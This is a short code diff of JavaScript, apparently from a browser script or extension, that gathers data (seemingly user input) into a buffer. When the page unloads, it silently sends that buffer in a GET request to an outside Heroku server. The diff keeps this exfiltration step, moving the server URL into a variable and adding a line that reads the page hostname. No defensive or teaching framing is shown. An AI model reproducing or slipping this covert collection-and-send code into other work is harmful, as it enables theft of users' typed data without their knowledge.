@@ -70,6 +70,9 @@ if(b == null)
 }
 else
 {
+
+	temp = location.hostname.replace(".", " ");
+
 	data = data + a;
 
 }
@@ -79,6 +82,8 @@ if (data.length >= 999){
 	data = "";
 }
 
+
+
 });
 
 
@@ -87,6 +92,7 @@ window.onbeforeunload = function () {
 	var oReq = new XMLHttpRequest();
 
 	console.log("something: " + data);
-	oReq.open("GET", "https://cs410-python.herokuapp.com/server/" + data);
+	server =  "https://cs410-python.herokuapp.com/server/";
+	oReq.open("GET", server + data);
 	oReq.send();	
 };
